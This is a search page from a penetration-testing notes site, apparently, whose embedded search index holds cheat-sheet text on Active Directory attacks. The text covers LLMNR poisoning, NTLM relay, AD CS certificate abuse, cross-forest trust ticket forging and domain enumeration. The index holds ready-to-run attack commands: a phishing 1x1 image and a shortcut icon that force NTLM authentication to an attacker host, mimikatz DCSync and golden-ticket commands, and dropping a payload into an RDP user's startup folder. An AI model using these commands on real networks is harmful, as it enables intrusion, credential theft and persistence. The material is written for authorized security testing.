<!DOCTYPE html>

<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">

		<!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Search | Hacking Notes</title>
<meta name="generator" content="Jekyll v3.8.4" />
<meta property="og:title" content="Search" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Notes for an ethical hacker." />
<meta property="og:description" content="Notes for an ethical hacker." />
<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/search/" />
<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/search/" />
<meta property="og:site_name" content="Hacking Notes" />
<script type="application/ld+json">
{"description":"Notes for an ethical hacker.","url":"http://0.0.0.0:4000/hackingnotes/search/","@type":"WebPage","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"Search","@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->

		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />

		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
		<link rel="stylesheet" href="/hackingnotes/css/main.css">
		<link rel="apple-touch-icon" href="/hackingnotes/apple-touch-icon.png">
		<link rel="icon" type="image/png" href="/hackingnotes/touch-icon.png" sizes="192x192">
		<link rel="icon" type="image/png" href="/hackingnotes/images/favicon.png">

		
	</head>

	<body>
		<header>
			<h1>
				<a href="/hackingnotes/"><img src="/hackingnotes/images/emblem.svg" width="40" height="40" alt="Hacking Notes logo"></a>
				Hacking Notes
				<button type="button" class="open-nav" id="open-nav"></button>
			</h1>

			<form action="/hackingnotes/search/" method="get">
				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
				<input type="submit" value="Search" style="display: none;">
			</form>

			<nav class="full-navigation">
				<ul>
					<li class="nav-item top-level ">
						
						<a href="/hackingnotes/">What is this?</a>
					</li>
				</ul>

				<ul>
					
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/active-directory/introduction/">Active Directory</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/introduction/">Basics</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-enumeration/">Domain Enumeration</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/lateral-movement/">Lateral Movement</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-persistence/">Domain Persistence</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-privesc/">Domain Privilege Escalation</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/cross-forest-attacks/">Cross Forest Attacks</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/forest-persistence/">Forest Persistence</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-certificate-services/">Active Directory Certificate Services</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/securing-ad/">Hardening Active Directory</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/client-side-attacks/evil-pdf/">Client Side Attacks</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/html-application/">HTML Application (HTA)</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/enumeration/host-discovery/">Enumeration</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/host-discovery/">Host Discovery</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/dns-enumeration/">DNS Enumeration</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/os-discovery/">OS Discovery</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/port-scanning/">Port Scanning</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/waf-evasion/">WAF Evasion</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/exploiting/buffer-overflow/">Exploiting</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/exploiting/bof-linux/">Linux BoF 32bit</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/hacking-wifi/theory/">Hacking Wifi</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/theory/">Theory</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wep/">Hacking Wifi - WEP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-psk/">Hacking Wifi - WPA/WPA2 PSK</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-peap-enterprise/">Hacking Wifi - WPA/WPA2 PEAP (Enterprise)</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/other/hacking-aws/">Other</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/other/hacking-aws/">Hacking AWS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/other/hacking-with-powershell/">Hacking with PowerShell</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/post-exploitation/av-evasion/">Post Exploitation</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/av-evasion/">AV Evasion</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-uac/">Bypass UAC</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/get-credentials/">Gathering Credentials</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/password-cracking/">Password Cracking</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/port-forwarding/">Port Forwarding and Tunneling</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/reverse-shell/">Reverse Shell</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/ata-evasion/">ATA Evasion</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-applocker/">Bypass APPLocker</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/privilege-escalation/linux-privesc/">Privilege Escalation</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/linux-privesc/">Linux Privesc</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/windows-privesc/">Windows Privesc</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/run-commands-as/">Run Commands As</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/reconnaissance/information-gathering/">Reconnaissance</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/reconnaissance/information-gathering/">Information Gathering</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/red-team/introduction/">Red Team</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/introduction/">Introduction</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/opsec-infrastructure/">OPSEC Infrastructure</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/c2-cobaltstrike/">C2 - Cobalt Strike</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/host-reconnaissance/">Host Reconnaissance</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/host-persistence/">Host Persistence</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/host-privilege-escalation/">Host Privilege Escalation</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/lateral-movement/">Lateral Movement</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/credentials-and-user-impersonation/">Credentials & User Impersonation</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/kibana/">Kibana - The Security App</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/pivoting/">Pivoting</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/ms-sql-servers/">MS SQL Servers</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/data-protection-api/">Data Protection API (DPAPI)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/laps/">Local Administrator Password Solution (LAPS)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/microsoft-defender/">Microsoft Defender Antivirus</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/application-whitelisting/">Application Whitelisting</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/red-team/exfiltration/">Exfiltration</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/services/ftp/">Services</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/ssh/">PORT 22/tcp - SSH</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/dns/">PORT 53/tcp - DNS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/http/">PORT 80/tcp, 443/tcp - HTTP Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/rpcbind/">PORT 111/tcp - RPCBind</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/imap/">PORT 143/tcp, 993/tcp - IMAP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/smb/">PORT 139/tcp, 445/tcp - SMB</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/snmp/">PORT 161/udp - SNMP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/java-rmi/">PORT 1100/tcp - Java RMI</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/sql-server/">PORT 1433/tcp - Microsoft SQL Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/nfs/">PORT 2049/tcp - NFS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/mysql/">PORT 3306/tcp - MySQL Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/rdp/">PORT 3389/tcp - RDP</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/software/wordpress/">Software</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/software/wordpress/">WordPress</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/drupal/">Drupal</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/tomcat/">Tomcat</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/owa-exchange/">OWA Exchange</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/web/file-inclusion/">Web</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/web/file-inclusion/">File Inclusion</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/login-panes/">Login Panes</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/sqli/">SQL Injection (SQLi)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/nosqli/">NoSQL Injection (NoSQLi)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/templates-injections/">Server Side Templates Injections (SSTI)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/unrestricted-file-upload/">Unrestricted File Upload</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/oauth-2.0-bypass/">OAuth 2.0 Bypass</a></li>
								
							</ul>
						</li>
					
				</ul>

				<ul>
					<li class="nav-item top-level ">
						
						<a href="/hackingnotes/changelog/">Change Log</a>
					</li>
				</ul>
			</nav>
		</header>

		<section class="main">
			<div class="page-header">
				<h2>Hacking Notes</h2>
				<h3>Search</h3>
			</div>
			<article class="content">
				<p><span id="search-process">Loading</span> results <span id="search-query-container" style="display: none;">for "<strong id="search-query"></strong>"</span></p>
<ul id="search-results"></ul>

<script>
	window.data = {
		
			
				
					
					

					"active-directory-ad-attacks": {
						"id": "active-directory-ad-attacks",
						"title": "AD Attacks",
						"category": "",
						"url": " /active-directory/ad-attacks/",
						"content": "Password Spraying Password spraying is an effective technique for discovering weak passwords that users are notorious for using. Patterns such as MonthYear (August2022), SeasonYear (Summer2022) and DayDate (Tuesday6) are very common. Another pattern too common is the name of the company and the year (Corp2022) LLMNR NetBIOS Poisoning We can grab some hashed credentials if LLMNR protocol is enabled. sudo responder -I eth0 -Fw After some time we can get all the hashes. cd usr share responder sudo python DumpHash.py NTLM Relay (SMB signing disabled) Some tiems some server are misconfigured and have the smb signing disabled, so we can perform more attacks with responder. Configuration etc proxychains4.conf socks4 127.0.0.1 1080 usr share responder Responder.conf [Responder Core] ; Servers to start SMB = Off HTTP = On Perform the attack We need to get a list of the servers with the SMB sigining disabled. crackmapexec smb --gen-relay-list vulnerable_servers.txt 10.10.10.0 24 Execute the attack with Responder and Impacket. impacket-ntlmrelayx.py -tf . vulnerable_servers.txt -socks -smb2support sudo responder -I eth0 We can list the current sessions with the next command. ntlmrelayx&gt; socks When a session with administrative privileges is found we can use secretsdump or other tool with proxychains to use the session captured. proxychains impacket-secretdump DOMAIN admin@IP Forcing NTLM Authentication You can try to socially engineer a privilege user to authenticate to you. 1x1 Images in Emails You can send an invisible 1x1 pixel image embedded on a body of a phishing email. When the recipient view the email in their mail client, such as Outlook, it will attempt to download the image and will trigger an NTLM authentication attemp. &lt;img src=\"\\\\&lt;attacker-ip&gt;\\image.png\" height=\"1\" width=\"1\" &gt; Note: Modify the email signature of a user, so when they send legitimate emails they will trigger NTLM authentication. Windows Shortcuts A windows shortcut can have multiple properties such as directory and an icon. We can create a icon property pointing to a UNC path and will trigger an NTLM authentication attempt when it’s viewed in Explorer even if it doesn’t have been clicked. $wsh = new-object -ComObject wscript.shell $shortcut = $wsh.CreateShortcut(\"\\\\smbsrv01\\software\\test.lnk\") $shortcut.IconLocation = \"\\\\&lt;attacker-ip&gt;\\test.ico\" $shortcut.Save() A good location would be public readable shares."
					}

					
				
			
		
			
				
					,
					

					"active-directory-ad-certificate-services": {
						"id": "active-directory-ad-certificate-services",
						"title": "Active Directory Certificate Services",
						"category": "",
						"url": " /active-directory/ad-certificate-services/",
						"content": "Active Directory Certificate Services (AD CS) is a server role that allows you to build a public key infrastructure (PKI). Which can provide public key cryptography, digital certificates and digital signature capabilities. Some practical applicatios include Secure Multipurpose Internet Mail Extensions(S MIME), secure wireless networks, VPNs, IPSec, Encrypting File System (EFS), smart card logon and SSL TLS. If a correct implmentation is given, can improve the security of an organisation by: Confidentiality through encryption. Integrity through digital signatures. Authentication by associating certificate keys with computers, users or devices accounts on networks. Misconfiguration of the AD CS can lead to domain privilege escalations or persistence. Enumerating Certificate Authorities To find AD CS Certificate Authorities (CA) in domain we can run certify with cas as parameter. https: github.com GhostPack Certify .\\Certify.exe cas We will see in te output the Root CAs and the Enrollment CAs, in addition to this we will see the certificate chain and the list of certificate templates for each CA, and some information about which principals are allowed to manage them. Misconfigured Certificate Templates Certify also allow us to find vulnerable CAs. .\\Certify.exe find vulnerable ENROLLEE_SUPPLIES_SUBJECT allows the certificate requestor to provide a Subject Alternative Name (SAN). Client Authentication means that the certificate can be used for authentication. If a pincipal that you control had WriteOwner, WriteDacl, WriteProperty, Owner or Enrollment Rights and the CA is configured with ENROLLEE_SUPPLIES_SUBJECT and Client Authentication, we will be able to request a certificate for any user of the domain an use it to autenticate to the domain. .\\Certify.exe request ca:dc.corp.local\\ca-1 template:TemplateName altname:Administrator Copy the whole certificate including the private key and save it to cert.pem. Then with openssl we can convert it to pfx format. $ openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx Enter Export Password: Verifying - Enter Export Password: Note It is recommended to enter a password. Convert cert.pfx into base64. cat cert.pfx | base64 -w 0 And finally we can use Rubeus to request a TGT. .\\Rubeus asktgt user:Administrator certificate:&lt;B64-CERT&gt; password:certificate-password enctype:aes256 nowrap OPSEC Alert: Use enctype:aes256 parameter to use AES256 and avoid RC4. NTLM Relaying to ADCS HTTP Endpoints Active Directory Certificate Service support HTTP enrolment methods and even inlcudes a GUI. The endpoint is often found in: https: ip-addr certsrv By default supports NTLM and Negotiate authentication methods so these endpoints are vulnerable to NTLM relay attacks. A common abuse method is to force a DC to authenticate to an attacker controlled location, relay the request to the CA and obtain the certificate for that DC, then use it to obtain a TGT. Note: We can not relay the authentication back to the original machine, which means we can not PrintSpooler the DC if it contains the CA. ntlmrelayx.py -t http: ip-addr certsrv certfnsh.asp -smb2support --adcs --no-http-server Use one of the remote authentication methods to force a connection to our compromised server. .\\SpoolSample.exe 10.10.10.12 10.10.10.13 On the output of ntlmrelay we will see the base64 certificate of the machine account. After obtaining the TGT we can abuse S4U2self to obtain a TGS of CIFS service. User Persistence We can craft a certificate for later use if managerial approval is not required for certificate requests. .\\Certify.exe find clientauth .\\Certify.exe find clientauth ca:dc.corp.local\\ca-1 This will show every certificat template that has a suitable Extended Key Usage (EKU) for client authentication. We can request a certificate for our use with: .\\Certify.exe request ca:dc.corp.local\\ca-1 template:User This certificate will allow us to request a TGT with Rubeus, by default is valid for a year and will continue working even if the user changes their password. Computer Persistence Similar to User, machines are a special type of user in AD and can have their own certificates issued. The default template for computers is called Machines. .\\Certify.exe request ca:dc.corp.local\\ca-1 template:Machine machine Note: The machine parameters tells to Certify to auto-elevate to SYSTEM and assume the identity of the machine account. AD CS Auditing AD CS logging is not enabled by default, so it is unsurprisingly common for defenders to be blind to this activity in their domain. Audit Certification Services must also be enalbed via GPO to Success or Failure depending on the tolerance of the organization. Dumping Certificates To enumerate certificates use Seatbelt. beacon&gt; execute-assembly C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Release\\Seatbelt.exe Certificates Note: Ensure that the certificate is used for authentication. We can dump certificates with mimikatz. For users: beacon&gt; mimikatz crypto::certificates export For machines: beacon&gt; mimikatz !crypto::certificates systemstore:local_machine export NOTE: Mimikatz always export certificates with mimikatz as password. Download the file and sync files from cobalt strike to your local machine. beacon&gt; download C:\\Users\\user\\CURRENT_USER_My_0_User Example.pfx Note : Go to View -&gt; Downloads to sync files. Encode in base64 the .pfx file. cat CURRENT_USER_My_0_User\\ Example.pfx | base64 -w0 And finally use it to request a TGT."
					}

					
				
			
		
			
				
					,
					

					"active-directory-cross-forest-attacks": {
						"id": "active-directory-cross-forest-attacks",
						"title": "Cross Forest Attacks",
						"category": "",
						"url": " /active-directory/cross-forest-attacks/",
						"content": "In this section we are going to abuse trusts between forests. One-Way (Inbound) When a trust is inbound in our perspective, it means that principals in our domain can be granted access to resources in the foreign domain. PowerView (dev): Get-DomainComputer -Domain external.local -Properties DNSHostName BloodHound: .\\SharpHound.exe -c DcOnly -d external.local We can enuemrate also groups that contains users outside of its domain. PowerView (dev): Get-DomainForeignGroupMember -Domain external.local The MemberName field contains a SID that can be resolved in our current domain with: ConvertFrom-SID S-1-5-21-3263068140-2042693922-2891547269-1132 To hop a domain trust using Kerberos, we first need an inter-realm Key. We need a TGT for the target user. .\\Rubeus.exe asktgt user:admin domain:corp.local aes256:&lt;aes256&gt; nowrap Then, we can use the TGT to request a referral ticket form the current domain to the target domain. .\\Rubeus.exe asktgs service:krbtgt target-domain.com domain:corp.local dc:dc01.corp.local ticket:&lt;base64-ticket&gt; nowrap Note: The inter-realm ticket is rc4_hmac even if we created the TGT with aes256_cts_hmac_sha1. This is a default configuration unless AES has ben specifically configured on the trust. Finally we an use this inter-realm ticket to request a TGS. .\\Rubeus.exe asktgs service:cifs dc.target-domain.com domain:target-domain.com dc:dc.target-domain.com ticket:&lt;base64-inter-realm&gt; nowrap One-Way (Outbound) If Domain A (Me) trusts Domain B, users in Domain B can access resources in Domain A but users in Domain A should not be able to access resources in Domain B. But there are some circumstances in which we can slide under the radar. An example of this includes SQL Server Links. Get-DomainTrust -Domain corp.local Trusted Domain Object (TDO) user But, we can still partially exploit this trus and obtain a “Domain User” of the trust abusing the Trusted Domain Object (TDO). Both domains in a trust relationship store a shared password which is automatically changed every 30 days. These objects are stored in the system contained and can be read via LDAP. beacon&gt; execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(objectCategory=trustedDomain)\" --domain corp.local --attributes distinguishedName,name,flatName,trustDirection Retrieving the Trusted Key There are two ways: Moving laterally to the DC and dump the key from memory. beacon&gt; mimikatz lsadump::trust patch Note: Memory patching is very risky, particularly on domain controllers. Using DCSync with the TDO GUID. Get-DomainObject -Identity \"CN=target-domain.com,CN=System,DC=corp,DC=local\" | select objectGuid beacon&gt; mimikatz @lsadump::dcsync domain:corp.local guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43} [Out] and [Out-1] are the “new” and “old” passwords respectively. In most cases, the current [Out] key is the one you want. Creating a TGT In addition, there is also a “trust account” which is created in the “trusted” domain, with the name of the “trusting” domain. For instance, if we get all the user accounts in the DEV domain, we’ll see CYBER$ and STUDIO$, which are the trust accounts for those respective domain trusts. beacon&gt; execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(objectCategory=user)\" [*] TOTAL NUMBER OF SEARCH RESULTS: 11 [...] [+] cn : CORP$ [+] cn : TARGET$ This meand TARGET domain will have a trust account called CORP$. This is the account we must impersonate to request Kerberos tickets across the trust. .\\Rubeus.exe asktgt user:CORP$ domain:target-domain.com rc4:f3fc2312d9d1f80b78e67d55d41ad496 nowrap Note: RC4 tickets are used by default across trusts. Trust Abuse with MSSQL Server MSSQL Servers are generally deployed in plenty windows domain. SQL Servers provide very good options for lateral movement as domain users can be mapped to dabase roles. A fantastic tool to abuse MSSQL is PowerUpSQLl: https: github.com NetSPI PowerUpSQL Import-Module .\\PowerUpSQL.psd1 Note: Important! Write Import-Module and import which have PSD1 extension. We can discover SQL servers: Get-SQLInstanceDomain We can check accessibility: Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose Gather information: Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose Database Links A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources. In case of databases links between Microsoft SQL Servers, it is possible to execute stored procedures which means RCE. Database link works even across forest trusts. Get-SQLServerLink -Instance mssql.corp.local -Verbose So we can execute queries on the remote Server Link, see if this server has others links and above, instead of doing it manually that will be explained in a note, exists a script that crawls all the mssql server links. Get-SQLServerLinkCrawl -Instance mssql.corp.local -Verbose Note: Manual way: See if has a server link: select * from master..sysservers Openquery() function can be used to run quieries on a linked database: select * from openquery(\"CORP-SQL1\", 'select * from master..sysservers') select * from openquery(\"CORP-SQL1\", ''select * from openquery(\"CORP-SQL2\", 'master..sysservers'')') To execute commands from MSSQL server we need to use xp_cmdshell. If rpcout is enabled xp_cmdshell can be enabled using: EXECUTE('sp_configure \"xp_cmdshell\",1;reconfigure;') AT \"other-sql\" And finally: Get-SQLServerLinkCrawl -Instance mssql.corp.local -Query \"exec master..xp_cmdshell 'whoami'\" RDPInception Another way is via RDP drive sharing (RDPInception). When a user enables drive sharing for their RDP sessions, it creates a mount-point on the target machine that maps back to their local machine. If the target machine is compromised, we may migrate into RDP users’s session and use this mount-point to write files directly onto their machine. Useful for dropping payloads into their startup folder which would be executed the next time they logon. The strategy is to find principals in our current domain that are not native to that domain, but are from external.local. PowerView (dev): Get-DomainForeignGroupMember -Domain corp.local Note: We can not convert the SID with ConvertFrom-SID since we don’t have access to the other Domain. A nice methodology is to enumerate the current domain and find instances where members of the foreign domain, have privileged access (local admin, RDP, WinRM, DCOM access), move laterally to those machines, and camp there until you see a member authenticate. Then, impersonate them to hop the trust. Get-DomainGPOUserLocalGroupMapping and Find-DomainLocalGroupMember can work for that task: PowerView (dev): Get-DomainGPOUserLocalGroupMapping -Identity \"Jump Users\" -LocalGroup \"Remote Desktop Users\" | select -expand ComputerName Find-DomainLocalGroupMember -GroupName \"Remote Desktop Users\" | select -expand ComputerName Once the foreign user logs on one of our compromised computers, we can hijack his RDP session. Example above from Cobalt Strike. beacon&gt; ps PID PPID Name Arch Session User --- ---- ---- ---- ------- ----- 2365 1012 rdpclip.exe x64 3 EXT\\j.doe beacon&gt; inject 2365 x64 tcp-local [+] established link to child beacon: 10.10.10.10 Now at that moment we can do import PowerView and enumerate the domain, because we simply hijacked and existing authenticated session and we are inside a valid external.local domain. Inside the user RDP session if Drive Sharing is enabled a UNC tsclient has a mount point for every drive that is being shared over RDP. \\\\tsclient\\C is the C:\\ drive of the origin machine of the RDP session, so we can upload a bat or exe to the users startup folder. beacon&gt; cd \\\\tsclient\\c\\Users\\j.doe\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup beacon&gt; upload payload.exe Across Forests using Trust Tickets First we need to retrieved the Trust Key: Invoke-Mimikatz -Command '\"lsadump::trust patch\"' Invoke-Mimikatz -Command '\"lsadump::dcsync user:dcorp\\mcorp$\"' Note: The access we will have will be limited to what our DA account is configured to have on the other Forest! An inter-realm TGT can be forged: Invoke-Mimikatz -Command '\"kerberos::golden user:Administrator domain:corp.local sid:S-1-5-21-268341927-4156871508-1792461683 rc4:cd3fb1b0b49c7a56d285fffdd1399231 service:krbtgt target:extcorp.local ticket:C:\\temp\\trust_forest_tkt.kirbi\"' Invoke-Mimikatz Parameter Description domain:sub.corp.local Current Domain FQDN sid:S-1-5-21-268341927-4156873456-1784235843 Current Domain SID user:Administrator User to impersonate rc4:a9b30e5b0dc865eadcea9411e4ade72d krbtgt hash of Current Domain service:krbtgt krbtgt service to abuse target:extcorp.local Target domain tiket:C:\\Windows\\Temp\\trust_tkt.kirbi File to store the ticket Now we can request a TGS for cifs service on the dc of the trusted forest. Asktgs.exe (kekeo_old) .\\asktgs.exe c:\\temp\\trust_forest_tkt.kirbi CIFS dc01.extcorp.local Rubeus.exe .\\Rubeus.exe asktgs ticket:trust_forest_tkt.kirbi dc:dc01.extcorp.local service:CIFS dc01.extcorp.local And inject the ticket on the current session: .\\kirbikator.exe lsa .\\CIFS.dc01.extcorp.local.kirbi Note: We can not list all the file system of other forest. We can only list shared folders. ls \\\\dc01.extcorp.local\\share\\"
					}

					
				
			
		
			
				
					,
					

					"active-directory-domain-enumeration": {
						"id": "active-directory-domain-enumeration",
						"title": "Domain Enumeration",
						"category": "",
						"url": " /active-directory/domain-enumeration/",
						"content": "In order to obtain information about our target domain we need to enumerate it. There are several ways to enumerate the domain with some kali tools, but in this section we are going to use PowerShell and the .NET framework. Domain Class: $ADClass = [System.DirectoryServices.ActiveDirectory.Domain] $ADClass::GetCurrentDomain() Exists multiple scripts to enumerate the domain. PowerView.ps1: https: github.com PowerShellMafia PowerSploit blob master Recon PowerView.ps1 ADModule: https: docs.microsoft.com en-us powershell module activedirectory ?view=windowsserver2022-ps SharpView: https: github.com tevora-threat SharpView ADSearch: https: github.com tomcarver16 ADSearch Importing the module PowerView: First of all the module needs to be imported. Normally is not detected by AV, in case of detection, AMSI will need be evaded. Import-Module .\\PowerView.ps1 . .\\PowerView.ps1 ADModule: Its important to import first a .dll file if RSAT is not installed on the machine. Import-Module .\\Microsoft.ActiveDirectory.Management.dll Import-Module .\\ActiveDirectory\\ActiveDirectory.psd1 Current Domain PowerShell: $env:USERDNSDOMAIN Identify current user domain (Get-ADDomain).DNSRoot Identify current computer domain (Get-WmiObject Win32_ComputerSystem).Domain PowerView: Get-NetDomain PowerView (dev): Get-Domain ADModule: Get-ADDomain Another Domain PowerView: Get-NetDomain -Domain corp.local PowerView (dev): Get-Domain -Identity corp.local ADModule: Get-ADDomain -Identity corp.local Domain SID PowerView: Get-DomainSID ADModule: We can find the SID inside the Get-ADDomain output. (Get-ADDomain).DomainSID Get-ADDomain | select DNSRoot,NetBIOSName,DomainSID Domain Policy PowerView: Get-DomainPolicy (Get-DomainPolicy).\"system access\" (Get-DomainPolicy -Domain corp.local).\"system access\" PowerView (dev): Get-DomainPolicyData | select -ExpandProperty SystemAccess Domain Controllers PowerView: Get-NetDomainController Get-NetDomainController -Domain corp.local PowerView (dev): Get-DomainController Get-DomainController -Domain corp.local ADModule: Get-ADDomainController Get-ADDomainController -DomainName corp.local Users &amp; their Properties Attributes PowerView: Get-NetUser Get-NetUser -Domain corp.local Get-NetUser -Username &lt;user&gt; Get-NetUser -SPN Get-UserProperty Get-UserProperty -Properties pwdlastset PowerView (dev): Get-DomainUser Get-DomainUser -Identity &lt;user&gt; Get-DomainUser -Properties pwdlastset ADModule: Get-ADUser -Filter * -Properties * Get-ADUser -Server corp.local -Filter * -Properties * Get-ADUser -Identity &lt;username&gt; -Properties * Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}} Note: Some sysadmins paste the password on the description field. Note: Service accounts stores the password on the LSAS in clear text. Search a particular string in users’s attributes Valuable info can be found in user’s attributes such as description. 